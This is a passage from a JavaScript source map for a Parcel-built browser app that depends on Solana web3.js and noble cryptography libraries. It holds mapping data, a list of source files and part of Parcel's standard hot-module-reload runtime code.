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","sources":["node_modules/@parcel/runtime-browser-hmr/lib/runtime-0098e38d391b9070.js","app.js","node_modules/@solana/web3.js/lib/index.browser.esm.js","node_modules/@solana/web3.js/src/utils/ed25519.ts","node_modules/@solana/web3.js/src/utils/to-buffer.ts","node_modules/@solana/web3.js/src/utils/borsh-schema.ts","node_modules/@solana/web3.js/src/publickey.ts","node_modules/@solana/web3.js/src/account.ts","node_modules/@solana/web3.js/src/bpf-loader-deprecated.ts","node_modules/@solana/web3.js/src/transaction/constants.ts","node_modules/@solana/web3.js/src/transaction/expiry-custom-errors.ts","node_modules/@solana/web3.js/src/message/account-keys.ts","node_modules/@solana/web3.js/src/layout.ts","node_modules/@solana/web3.js/src/utils/shortvec-encoding.ts","node_modules/@solana/web3.js/src/utils/assert.ts","node_modules/@solana/web3.js/src/message/compiled-keys.ts","node_modules/@solana/web3.js/src/utils/guarded-array-utils.ts","node_modules/@solana/web3.js/src/message/legacy.ts","node_modules/@solana/web3.js/src/message/v0.ts","node_modules/@solana/web3.js/src/message/versioned.ts","node_modules/@solana/web3.js/src/transaction/legacy.ts","node_modules/@solana/web3.js/src/transaction/message.ts","node_modules/@solana/web3.js/src/transaction/versioned.ts","node_modules/@solana/web3.js/src/timing.ts","node_modules/@solana/web3.js/src/sysvar.ts","node_modules/@solana/web3.js/src/errors.ts","node_modules/@solana/web3.js/src/utils/send-and-confirm-transaction.ts","node_modules/@solana/web3.js/src/utils/sleep.ts","node_modules/@solana/web3.js/src/instruction.ts","node_modules/@solana/web3.js/src/fee-calculator.ts","node_modules/@solana/web3.js/src/nonce-account.ts","node_modules/@solana/web3.js/src/utils/bigint.ts","node_modules/@solana/web3.js/src/programs/system.ts","node_modules/@solana/web3.js/src/loader.ts","node_modules/@solana/web3.js/src/bpf-loader.ts","node_modules/@solana/web3.js/node_modules/.pnpm/fast-stable-stringify@1.0.0/node_modules/fast-stable-stringify/index.js","node_modules/@solana/web3.js/src/epoch-schedule.ts","node_modules/@solana/web3.js/src/__forks__/browser/fetch-impl.ts","node_modules/@solana/web3.js/src/rpc-websocket.ts","node_modules/@solana/web3.js/src/account-data.ts","node_modules/@solana/web3.js/src/programs/address-lookup-table/state.ts","node_modules/@solana/web3.js/src/utils/makeWebsocketUrl.ts","node_modules/@solana/web3.js/src/connection.ts","node_modules/@solana/web3.js/src/keypair.ts","node_modules/@solana/web3.js/src/programs/address-lookup-table/index.ts","node_modules/@solana/web3.js/src/programs/compute-budget.ts","node_modules/@solana/web3.js/src/programs/ed25519.ts","node_modules/@solana/web3.js/src/utils/secp256k1.ts","node_modules/@solana/web3.js/src/programs/secp256k1.ts","node_modules/@solana/web3.js/src/programs/stake.ts","node_modules/@solana/web3.js/src/programs/vote.ts","node_modules/@solana/web3.js/src/validator-info.ts","node_modules/@solana/web3.js/src/vote-account.ts","node_modules/@solana/web3.js/src/utils/cluster.ts","node_modules/@solana/web3.js/src/utils/send-and-confirm-raw-transaction.ts","node_modules/@solana/web3.js/src/index.ts","node_modules/buffer/index.js","node_modules/base64-js/index.js","node_modules/ieee754/index.js","node_modules/@noble/curves/ed25519.js","node_modules/@noble/curves/src/ed25519.ts","node_modules/@noble/curves/node_modules/@noble/hashes/sha512.js","node_modules/@noble/curves/node_modules/@noble/hashes/src/sha512.ts","node_modules/@noble/curves/node_modules/@noble/hashes/_md.js","node_modules/@noble/curves/node_modules/@noble/hashes/src/_md.ts","node_modules/@noble/curves/node_modules/@noble/hashes/_assert.js","node_modules/@noble/curves/node_modules/@noble/hashes/src/_assert.ts","node_modules/@noble/curves/node_modules/@noble/hashes/utils.js","node_modules/@noble/curves/node_modules/@noble/hashes/src/utils.ts","node_modules/@noble/curves/node_modules/@noble/hashes/crypto.js","node_modules/@noble/curves/node_modules/@noble/hashes/src/crypto.ts","node_modules/@noble/curves/node_modules/@noble/hashes/_u64.js","node_modules/@noble/curves/node_modules/@noble/hashes/src/_u64.ts","node_modules/@noble/curves/abstract/edwards.js","node_modules/@noble/curves/src/abstract/edwards.ts","node_modules/@noble/curves/abstract/curve.js","node_modules/@noble/curves/src/abstract/curve.ts","node_modules/@noble/curves/abstract/modular.js","node_modules/@noble/curves/src/abstract/modular.ts","node_modules/@noble/curves/abstract/utils.js","node_modules/@noble/curves/src/abstract/utils.ts","node_modules/@noble/curves/abstract/hash-to-curve.js","node_modules/@noble/curves/src/abstract/hash-to-curve.ts","node_modules/@noble/curves/abstract/montgomery.js","node_modules/@noble/curves/src/abstract/montgomery.ts","node_modules/bn.js/lib/bn.js","node_modules/@parcel/node-resolver-core/lib/_empty.js","node_modules/bs58/index.js","node_modules/base-x/src/index.js","node_modules/safe-buffer/index.js","node_modules/@noble/hashes/sha256.js","node_modules/@noble/hashes/src/sha256.ts","node_modules/@noble/hashes/_md.js","node_modules/@noble/hashes/src/_md.ts","node_modules/@noble/hashes/_assert.js","node_modules/@noble/hashes/src/_assert.ts","node_modules/@noble/hashes/utils.js","node_modules/@noble/hashes/src/utils.ts","node_modules/@noble/hashes/crypto.js","node_modules/@noble/hashes/src/crypto.ts","node_modules/borsh/lib/index.js","node_modules/text-encoding-utf-8/lib/encoding.lib.js","node_modules/@solana/buffer-layout/lib/Layout.js","node_modules/@solana/buffer-layout/src/Layout.ts","node_modules/bigint-buffer/dist/browser.js","node_modules/superstruct/dist/index.mjs","node_modules/superstruct/src/error.ts","node_modules/superstruct/src/utils.ts","node_modules/superstruct/src/struct.ts","node_modules/superstruct/src/structs/utilities.ts","node_modules/superstruct/src/structs/types.ts","node_modules/superstruct/src/structs/coercions.ts","node_modules/superstruct/src/structs/refinements.ts","node_modules/@parcel/transformer-js/src/esmodule-helpers.js","node_modules/jayson/lib/client/browser/index.js","node_modules/uuid/dist/esm-browser/index.js","node_modules/uuid/dist/esm-browser/v1.js","node_modules/uuid/dist/esm-browser/rng.js","node_modules/uuid/dist/esm-browser/stringify.js","node_modules/uuid/dist/esm-browser/validate.js","node_modules/uuid/dist/esm-browser/regex.js","node_modules/uuid/dist/esm-browser/v3.js","node_modules/uuid/dist/esm-browser/v35.js","node_modules/uuid/dist/esm-browser/parse.js","node_modules/uuid/dist/esm-browser/md5.js","node_modules/uuid/dist/esm-browser/v4.js","node_modules/uuid/dist/esm-browser/v5.js","node_modules/uuid/dist/esm-browser/sha1.js","node_modules/uuid/dist/esm-browser/nil.js","node_modules/uuid/dist/esm-browser/version.js","node_modules/jayson/lib/generateRequest.js","node_modules/rpc-websockets/dist/index.browser.mjs","node_modules/rpc-websockets/node_modules/esbuild-plugin-polyfill-node/polyfills/buffer.js","node_modules/rpc-websockets/src/lib/client/websocket.browser.ts","node_modules/rpc-websockets/src/lib/client.ts","node_modules/rpc-websockets/src/lib/utils.ts","node_modules/rpc-websockets/src/index.browser.ts","node_modules/eventemitter3/index.js","node_modules/@noble/hashes/sha3.js","node_modules/@noble/hashes/src/sha3.ts","node_modules/@noble/hashes/_u64.js","node_modules/@noble/hashes/src/_u64.ts","node_modules/@noble/curves/secp256k1.js","node_modules/@noble/curves/src/secp256k1.ts","node_modules/@noble/curves/node_modules/@noble/hashes/sha256.js","node_modules/@noble/curves/node_modules/@noble/hashes/src/sha256.ts","node_modules/@noble/curves/_shortw_utils.js","node_modules/@noble/curves/src/_shortw_utils.ts","node_modules/@noble/curves/node_modules/@noble/hashes/hmac.js","node_modules/@noble/curves/node_modules/@noble/hashes/src/hmac.ts","node_modules/@noble/curves/abstract/weierstrass.js","node_modules/@noble/curves/src/abstract/weierstrass.ts"],"sourcesContent":["var HMR_HOST = null;var HMR_PORT = null;var HMR_SECURE = false;var HMR_ENV_HASH = \"d6ea1d42532a7575\";var HMR_USE_SSE = false;module.bundle.HMR_BUNDLE_ID = \"138b6a135baa4167\";\"use strict\";\n\n/* global HMR_HOST, HMR_PORT, HMR_ENV_HASH, HMR_SECURE, HMR_USE_SSE, chrome, browser, __parcel__import__, __parcel__importScripts__, ServiceWorkerGlobalScope */\n/*::\nimport type {\n  HMRAsset,\n  HMRMessage,\n} from '@parcel/reporter-dev-server/src/HMRServer.js';\ninterface ParcelRequire {\n  (string): mixed;\n  cache: {|[string]: ParcelModule|};\n  hotData: {|[string]: mixed|};\n  Module: any;\n  parent: ?ParcelRequire;\n  isParcelRequire: true;\n  modules: {|[string]: [Function, {|[string]: string|}]|};\n  HMR_BUNDLE_ID: string;\n  root: ParcelRequire;\n}\ninterface ParcelModule {\n  hot: {|\n    data: mixed,\n    accept(cb: (Function) => void): void,\n    dispose(cb: (mixed) => void): void,\n    // accept(deps: Array<string> | string, cb: (Function) => void): void,\n    // decline(): void,\n    _acceptCallbacks: Array<(Function) => void>,\n    _disposeCallbacks: Array<(mixed) => void>,\n  |};\n}\ninterface ExtensionContext {\n  runtime: {|\n    reload(): void,\n    getURL(url: string): string;\n    getManifest(): {manifest_version: number, ...};\n  |};\n}\ndeclare var module: {bundle: ParcelRequire, ...};\ndeclare var HMR_HOST: string;\ndeclare var HMR_PORT: string;\ndeclare var HMR_ENV_HASH: string;\ndeclare var HMR_SECURE: boolean;\ndeclare var HMR_USE_SSE: boolean;\ndeclare var chrome: ExtensionContext;\ndeclare var browser: ExtensionContext;\ndeclare var __parcel__import__: (string) => Promise<void>;\ndeclare var __parcel__importScripts__: (string) => Promise<void>;\ndeclare var globalThis: typeof self;\ndeclare var ServiceWorkerGlobalScope: Object;\n*/\nvar OVERLAY_ID = '__parcel__error__overlay__';\nvar OldModule = module.bundle.Module;\nfunction Module(moduleName) {\n  OldModule.call(this, moduleName);\n  this.hot = {\n    data: module.bundle.hotData[moduleName],\n    _acceptCallbacks: [],\n    _disposeCallbacks: [],\n    accept: function (fn) {\n      this._acceptCallbacks.push(fn || function () {});\n    },\n    dispose: function (fn) {\n      this._disposeCallbacks.push(fn);\n    }\n  };\n  module.bundle.hotData[moduleName] = undefined;\n}\nmodule.bundle.Module = Module;\nmodule.bundle.hotData = {};\nvar checkedAssets /*: {|[string]: boolean|} */, disposedAssets /*: {|[string]: boolean|} */, assetsToDispose /*: Array<[ParcelRequire, string]> */, assetsToAccept /*: Array<[ParcelRequire, string]> */;\nfunction getHostname() {\n  return HMR_HOST || (location.protocol.indexOf('http') === 0 ? location.hostname : 'localhost');\n}\nfunction getPort() {\n  return HMR_PORT || location.port;\n}\n\n// eslint-disable-next-line no-redeclare\nvar parent = module.bundle.parent;\nif ((!parent || !parent.isParcelRequire) && typeof WebSocket !== 'undefined') {\n  var hostname = getHostname();\n  var port = getPort();\n  var protocol = HMR_SECURE || location.protocol == 'https:' && !['localhost', '127.0.0.1', '0.0.0.0'].includes(hostname) ? 'wss' : 'ws';\n  var ws;\n  if (HMR_USE_SSE) {\n    ws = new EventSource('/__parcel_hmr');\n  } else {\n    try {\n      ws = new WebSocket(protocol + '://' + hostname + (port ? ':' + port : '') + '/');\n    } catch (err) {\n      if (err.message) {\n        console.error(err.message);\n      }\n      ws = {};\n    }\n  }\n\n  // Web extension context\n  var extCtx = typeof browser === 'undefined' ? typeof chrome === 'undefined' ? null : chrome : browser;\n\n  // Safari doesn't support sourceURL in error stacks.\n  // eval may also be disabled via CSP, so do a quick check.\n  var supportsSourceURL = false;\n  try {\n    (0, eval)('throw new Error(\"test\"); //# sourceURL=test.js');\n  } catch (err) {\n    supportsSourceURL = err.stack.includes('test.js');\n  }\n\n  // $FlowFixMe\n  ws.onmessage = async function (event /*: {data: string, ...} */) {\n    checkedAssets = {} /*: {|[string]: boolean|} */;\n    disposedAssets = {} /*: {|[string]: boolean|} */;\n    assetsToAccept = [];\n    assetsToDispose = [];\n    var data /*: HMRMessage */ = JSON.parse(event.data);\n    if (data.type === 'reload') {\n      fullReload();\n    } else if (data.type === 'update') {\n      // Remove error overlay if there is one\n      if (typeof document !== 'undefined') {\n        removeErrorOverlay();\n      }\n      let assets = data.assets.filter(asset => asset.envHash === HMR_ENV_HASH);\n\n      // Handle HMR Update\n      let handled = assets.every(asset => {\n        return asset.type === 'css' || asset.type === 'js' && hmrAcceptCheck(module.bundle.root, asset.id, asset.depsByBundle);\n      });\n      if (handled) {\n        console.clear();\n\n        // Dispatch custom event so other runtimes (e.g React Refresh) are aware.\n        if (typeof window !== 'undefined' && typeof CustomEvent !== 'undefined') {\n          window.dispatchEvent(new CustomEvent('parcelhmraccept'));\n        }\n        await hmrApplyUpdates(assets);\n        hmrDisposeQueue();\n\n        // Run accept callbacks. This will also re-execute other disposed assets in topological order.\n        let processedAssets = {};\n        for (let i = 0; i < assetsToAccept.length; i++) {\n          let id = assetsToAccept[i][1];\n          if (!processedAssets[id]) {\n            hmrAccept(assetsToAccept[i][0], id);\n            processedAssets[id] = true;\n          }\n        }\n      } else fullReload();\n    }\n    if (data.type === 'error') {\n      // Log parcel errors to console\n      for (let ansiDiagnostic of data.diagnostics.ansi) {\n        let stack = ansiDiagnostic.codeframe ? ansiDiagnostic.codeframe : ansiDiagnostic.stack;\n        console.error('🚨 [parcel]: ' + ansiDiagnostic.message + '\\n' + stack + '\\n\\n' + ansiDiagnostic.hints.join('\\n'));\n      }\n      if (typeof document !== 'undefined') {\n        // Render the fancy html overlay\n        removeErrorOverlay();\n        var overlay = createErrorOverlay(data.diagnostics.html);\n        // $FlowFixMe\n        document.body.appendChild(overlay);\n      }\n    }\n  };\n  if (ws instanceof WebSocket) {\n    ws.onerror = function (e) {\n      if (e.message) {\n        console.error(e.message);\n      }\n    };\n    ws.onclose = function () {\n      console.warn('[parcel] 🚨 Connection to the HMR server was lost');\n    };\n  }\n}\nfunction removeErrorOverlay() {\n  var overlay = document.getElementById(OVERLAY_ID);\n  if (overlay) {\n    overlay.remove();\n    console.log('[parcel] ✨ Error resolved');\n  }\n}\nfunction createErrorOverlay(diagnostics) {\n  var overlay = document.createElement('div');\n  overlay.id = OVERLAY_ID;\n  let errorHTML = '<div style=\"background: black; opacity: 0.85; font-size: 16px; color: white; position: fixed; height: 100%; width: 100%; top: 0px; left: 0px; padding: 30px; font-family: Menlo, Consolas, monospace; z-index: 9999;\">';\n  for (let diagnostic of diagnostics) {\n    let stack = diagnostic.frames.length ? diagnostic.frames.reduce((p, frame) => {\n      return `${p}\n<a href=\"/__parcel_launch_editor?file=${encodeURIComponent(frame.location)}\" style=\"text-decoration: underline; color: #888\" onclick=\"fetch(this.href); return false\">${frame.location}</a>\n${frame.code}`;\n    }, '') : diagnostic.stack;\n    errorHTML += `\n      <div>\n        <div style=\"font-size: 18px; font-weight: bold; margin-top: 20px;\">\n          🚨 ${diagnostic.message}\n        </div>\n        <pre>${stack}</pre>\n        <div>\n          ${diagnostic.hints.map(hint => '<div>💡 ' + hint + '</div>').join('')}\n        </div>\n        ${diagnostic.documentation ? `<div>📝 <a style=\"color: violet\" href=\"${diagnostic.documentation}\" target=\"_blank\">Learn more</a></div>` : ''}\n      </div>\n    `;\n  }\n  errorHTML += '</div>';\n  overlay.innerHTML = errorHTML;\n  return overlay;\n}\nfunction fullReload() {\n  if ('reload' in location) {\n    location.reload();\n  } else if (extCtx && extCtx.runtime && extCtx.runtime.reload) {\n    extCtx.runtime.reload();\n  }\n}\nfunction getParents(bundle, id) /*: Array<[ParcelRequire, string]> */{\n  var modules = bundle.modules;\n  if (!modules) {\n    return [];\n  }\n  var parents = [];\n  var k, d, dep;\n  for (k in modules) {\n    for (d in modules[k][1]) {\n      dep = modules[k][1][d];\n      if (dep === id || Array.isArray(dep) && dep[dep.length - 1] === id) {\n        parents.push([bundle, k]);\n      }\n    }\n  }\n  if (bundle.parent) {\n    parents = parents.concat(getParents(bundle.parent, id));\n  }\n  return parents;\n}\nfunction updateLink(link) {\n  var href = link.getAttribute('href');\n  if (!href) {\n    return;\n  }\n  var newLink = link.cloneNode();\n  newLink.onload = function () {\n    if (link.parentNode !== null) {\n      // $FlowFixMe\n      link.parentNode.removeChild(link);\n    }\n  };\n  newLink.setAttribute('href',\n  // $FlowFixMe\n  href.split('?')[0] + '?' + Date.now());\n  // $FlowFixMe\n  link.parentNode.insertBefore(newLink, link.nextSibling);\n}\nvar cssTimeout = null;\nfunction reloadCSS() {\n  if (cssTimeout) {\n    return;\n  }\n  cssTimeout = setTimeout(function () {\n    var links = document.querySelectorAll('link[rel=\"stylesheet\"]');\n    for (var i = 0; i < links.length; i++) {\n      // $FlowFixMe[incompatible-type]\n      var href /*: string */ = links[i].getAttribute('href');\n      var hostname = getHostname();\n      var servedFromHMRServer = hostname === 'localhost' ? new RegExp('^(https?:\\\\/\\\\/(0.0.0.0|127.0.0.1)|localhost):' + getPort()).test(href) : href.indexOf(hostname + ':' + getPort());\n      var absolute = /^https?:\\/\\//i.test(href) && href.indexOf(location.origin) !== 0 && !servedFromHMRServer;\n      if (!absolute) {\n        updateLink(links[i]);\n      }\n    }\n    cssTimeout = null;\n  }, 50);\n}\nfunction hmrDownload(asset) {\n  if (asset.type === 'js') {\n    if (typeof document !== 'undefined') {\n      let script = document.createElement('script');\n      script.src = asset.url + '?t=' + Date.now();\n      if (asset.outputFormat === 'esmodule') {\n        script.type = 'module';\n      }\n      return new Promise((resolve, reject) => {\n        var _document$head;\n        script.onload = () => resolve(script);\n        script.onerror = reject;\n        (_document$head = document.head) === null || _document$head === void 0 || _document$head.appendChild(script);\n      });\n    } else if (typeof importScripts === 'function') {\n      // Worker scripts\n      if (asset.outputFormat === 'esmodule') {\n        return __parcel__import__(asset.url + '?t=' + Date.now());\n      } else {\n        return new Promise((resolve, reject) => {\n          try {\n            __parcel__importScripts__(asset.url + '?t=' + Date.now());\n            resolve();\n          } catch (err) {\n            reject(err);\n          }\n        });\n      }\n    }\n  }\n}\nasync function hmrApplyUpdates(assets) {\n  global.parcelHotUpdate = Object.create(null);\n  let scriptsToRemove;\n  try {\n    // If sourceURL comments aren't supported in eval, we need to load\n    // the update from the dev server over HTTP so that stack traces\n    // are correct in errors/logs. This is much slower than eval, so\n    // we only do it if needed (currently just Safari).\n    // https://bugs.webkit.org/show_bug.cgi?id=137297\n    // This path is also taken if a CSP disallows eval.\n    if (!supportsSourceURL) {\n      let promises = assets.map(asset => {\n        var _hmrDownload;\n        return (_hmrDownload = hmrDownload(asset)) === null || _hmrDownload === void 0 ? void 0 : _hmrDownload.catch(err => {\n          // Web extension fix\n          if (extCtx && extCtx.runtime && extCtx.runtime.getManifest().manifest_version == 3 && typeof ServiceWorkerGlobalScope != 'undefined' && global instanceof ServiceWorkerGlobalScope) {\n            extCtx.runtime.reload();\n            return;\n          }\n          throw err;\n        });\n      });\n      scriptsToRemove = await Promise.all(promises);\n    }\n    assets.forEach(function (asset) {\n      hmrApply(module.bundle.root, asset);\n    });\n  } finally {\n    delete global.parcelHotUpdate;\n    if (scriptsToRemove) {\n      scriptsToRemove.forEach(script => {\n        if (script) {\n          var _document$head2;\n          (_document$head2 = document.head) === null || _document$head2 === void 0 || _document$head2.removeChild(script);\n        }\n      });\n    }\n  }\n}\nfunction hmrApply(bundle /*: ParcelRequire */, asset /*:  HMRAsset */) {\n  var modules = bundle.modules;\n  if (!modules) {\n    return;\n  }\n  if (asset.type === 'css') {\n    reloadCSS();\n  } else if (asset.type === 'js') {\n    let deps = asset.depsByBundle[bundle.HMR_BUNDLE_ID];\n    if (deps) {\n      if (modules[asset.id]) {\n        // Remove dependencies that are removed and will become orphaned.\n        // This is necessary so that if the asset is added back again, the cache is gone, and we prevent a full page reload.\n        let oldDeps = modules[asset.id][1];\n        for (let dep in oldDeps) {\n          if (!deps[dep] || deps[dep] !== oldDeps[dep]) {\n            let id = oldDeps[dep];\n            let parents = getParents(module.bundle.root, id);\n            if (parents.length === 1) {\n              hmrDelete(module.bundle.root, id);\n            }\n          }\n        }\n      }\n      if (supportsSourceURL) {\n        // Global eval. We would use `new Function` here but browser\n        // support for source maps is better with eval.\n        (0, eval)(asset.output);\n      }\n\n      // $FlowFixMe\n      let fn = global.parcelHotUpdate[asset.id];\n      modules[asset.id] = [fn, deps];\n    }\n\n    // Always traverse to the parent bundle, even if we already replaced the asset in this bundle.\n    // This is required in case modules are duplicated. We need to ensure all 